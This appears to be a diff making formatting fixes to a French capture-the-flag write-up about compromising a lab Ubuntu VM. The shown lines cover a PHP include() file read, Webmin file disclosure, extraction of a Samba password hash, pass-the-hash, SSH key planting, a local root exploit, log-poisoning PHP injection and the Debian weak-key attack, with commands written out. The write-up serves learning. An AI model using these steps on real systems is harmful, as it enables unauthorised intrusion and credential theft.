@@ -60,7 +60,7 @@ Faisons tout de même un tour du côté du *Samba* pour voir si on trouve quelqu
 whereis samba (in the kitchen ?)
 --------------------------------
 
-```
+```console
 $ nmblookup -A 192.168.1.27
 Looking up status of 192.168.1.27
         UBUNTUVM        <00> -         H <ACTIVE> 
@@ -96,13 +96,13 @@ Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
 
 On tente d’accéder au partage via une connexion anonyme mais l'accès est refusé :  
 
-```
+```console
 $ smbclient -I 192.168.1.27 -U "" -N //UBUNTUVM/home
 Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
 
-*Metasploit* propose divers exploits pour *Samba* (*lsa\_transnames\_heap, chain\_reply, setinfopolicy\_heap*) mais aucun ne nous ouvre de porte.  
+*Metasploit* propose divers exploits pour *Samba* (`lsa_transnames_heap`, `chain_reply`, `setinfopolicy_heap`) mais aucun ne nous ouvre de porte.  
 
 En revanche le module pour énumérer les utilisateurs donne de bons résultats.  
 
@@ -123,8 +123,8 @@ On décide alors de se tourner vers le site web qui est tout aussi minimaliste q
 
 L'index à la racine du site effectue une redirection via javascript sur laquelle *Wapiti* bute. Il suffit d'utiliser l'option -s pour lui donner un point de départ supplémentaire (output réduit) :  
 
-```
-./bin/wapiti http://192.168.1.27/ -s "http://192.168.1.27/index1.php?help=true&connect=true" -m "all,nikto,backup,htaccess"
+```console
+$ ./bin/wapiti http://192.168.1.27/ -s "http://192.168.1.27/index1.php?help=true&connect=true" -m "all,nikto,backup,htaccess"
 
 [+] Lancement du module file
 Eventuelle faille de type include() dans http://192.168.1.27/index1.php via une injection dans le paramètre connect
@@ -152,9 +152,9 @@ Cela peut être contourné bien l'utilisation de filtres qui convertissent les d
 connect=php://filter/convert.base64-encode/resource=php/phpMyAdmin/config.inc.php
 ```
 
-De cette façon on obtient le contenu du fichier de configuration de *phpMyAdmin* encodé en *base64*.  
+De cette façon, on obtient le contenu du fichier de configuration de *phpMyAdmin* encodé en *base64*.  
 
-Mais une fois décodé on se rends compte que MySQL utilise un compte root en local uniquement sans mot de passe (pas de mot de passe et pas d'accès depuis l'extérieur, on n'est pas plus avancés).  
+Mais une fois décodé on se rend compte que MySQL utilise un compte root en local uniquement sans mot de passe (pas de mot de passe et pas d'accès depuis l'extérieur, on n'est pas plus avancés).  
 
 Avec un script fait main je peux lister rapidement les fichiers auxquels j'ai accès via cette faille include() :  
 
@@ -209,7 +209,7 @@ Acces a /home/vmware/.profile ok
 Acces a /home/vmware/.bashrc ok
 ```
 
-Le *.bash\_history* du root, bien que remplis, ne donne rien d'intéressant pour la résolution du CTF.  
+Le `.bash_history` du root, bien que remplis, ne donne rien d'intéressant pour la résolution du CTF.  
 
 Qui plus est, aucun accès a des clés SSH n'a été trouvé.  
 
@@ -221,14 +221,14 @@ osama:x:1002:1002::/home/osama:/bin/bash
 yomama:x:1003:1003::/home/yomama:/bin/bash
 ```
 
-Là encore *Medusa* (pour SMB) et *Hydra* (pour SSH) ne donnent aucun résultats.  
+Là encore *Medusa* (pour SMB) et *Hydra* (pour SSH) ne donnent aucuns résultats.  
 
 Il est temps de se tourner vers le Webmin.  
 
 Webmin and 3 little monkeys
 ---------------------------
 
-Le module file\_disclosure de *Metasploit* va au delà de nos attentes puisqu'on voit ce que root voit :  
+Le module `file_disclosure` de *Metasploit* va au delà de nos attentes puisqu'on voit ce que root voit :  
 
 ```
 msf> use auxiliary/admin/webmin/file_disclosure
@@ -275,7 +275,7 @@ L'autre méthode consiste à obtenir le hash dans une forme plus attaquable, c'e
 
 Pour cela on doit récupérer la base des utilisateurs Samba :  
 
-```
+```bash
 msfcli auxiliary/admin/webmin/file_disclosure RHOST=192.168.1.27 RPATH=/var/lib/samba/passdb.tdb E > /tmp/tdb
 ```
 
@@ -283,7 +283,7 @@ On la passe ensuite à un éditeur hexadécimal pour retirer l'output de *Metasp
 
 On doit recopier le fichier tdb sur son système pour que les outils Samba le retrouvent (je n'ai pas vu d'options pour spécifier un path particulier).  
 
-```
+```console
 # cp /tmp/tdb /etc/samba/passdb.tdb
 # pdbedit -L -w
 vmware:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:FD64812D22B9B94638C2A7FF8C49DDC6:[U          ]:LCT-485138D9:
@@ -295,7 +295,7 @@ Encore mieux, on peut réutiliser le hash via la technique *pass-the-hash*, sauf
 
 *Impacket* a un script qui marche (plus ou moins) avec Samba (3rd monkey) :  
 
-```
+```console
 python-impacket$ python examples/smbclient.py
 # open 192.168.1.27 445
 # login_hash vmware 00000000000000000000000000000000 FD64812D22B9B94638C2A7FF8C49DDC6
@@ -318,9 +318,9 @@ IPC$
 Accio shell !
 -------------
 
-Dans tous les cas on arrive sur l'opération suivante qui consiste à récupérer le fichier *authorized\_keys* de l'utilisateur *vmware*, y ajouter notre clé publique et le renvoyer dans *.ssh* :  
+Dans tous les cas, on arrive sur l'opération suivante qui consiste à récupérer le fichier `authorized_keys` de l'utilisateur *vmware*, y ajouter notre clé publique et le renvoyer dans *.ssh* :  
 
-```
+```console
 $ smbclient -I 192.168.1.27 -U vmware //UBUNTUVM/home
 Enter vmware's password: 
 Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
@@ -351,8 +351,8 @@ putting file authorized_keys as \.ssh\authorized_keys (779,2 kb/s) (average 779,
 
 On obtient alors notre shell tant attendu :  
 
-```
-ssh vmware@192.168.1.27
+```console
+$ ssh vmware@192.168.1.27
 Enter passphrase for key 'id_rsa': 
 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
 
@@ -368,7 +368,7 @@ sudo accio shell !
 
 On récupère un exploit pour passer root. Ici [un exploit pour sock\_sendpage() qui utilise la présence de PulseAudio sur le système](http://www.exploit-db.com/exploits/9641/) :  
 
-```
+```console
 vmware@ubuntuvm:~$ tar zxvf 2009-linux-sendpage3.tar.gz 
 linux-sendpage3/
 linux-sendpage3/sesearch-mmap_zero
@@ -401,7 +401,7 @@ Toutefois, admettons que les logs de Samba fussent lisibles on aurait d'abord re
 
 Il aurait alors été possible d'injecter du PHP dans les logs en faisant appel à un partage inexistant :  
 
-```
+```console
 $ smbclient -I 192.168.1.27  '//UBUNTUVM/<?php phpinfo(); ?>' -U "" -N
 ```
 
@@ -413,7 +413,7 @@ Pour faire court, cette faille permet de retrouver une clé privée valide à pa
 
 Un exmple sera plus parlant. On trouve [un exploit en Python sur exploit-db](http://www.exploit-db.com/exploits/5720/) :  
 
-```
+```console
 $ python bkeys.py
 
 -OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
@@ -444,7 +444,7 @@ Tested 16654 keys | Remaining 16114 keys | Aprox. Speed 40/sec
 
 Copier / coller  
 
-```
+```console
 $ ssh -lobama -p22 -i rsa/2048//dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.1.27
 Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686
 
